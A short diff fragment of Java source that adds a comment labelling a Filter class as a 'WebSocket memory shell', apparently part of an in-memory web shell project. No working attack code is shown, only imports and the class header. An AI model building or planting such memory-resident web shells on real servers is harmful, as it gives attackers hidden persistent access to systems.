@@ -7,6 +7,9 @@ import java.lang.reflect.Method;
 import java.util.EnumSet;
 import java.util.List;
 
+/**
+ * WebSocket 内存马
+ */
 public class WSFMSFromThread implements Filter {
 
     public Session session;
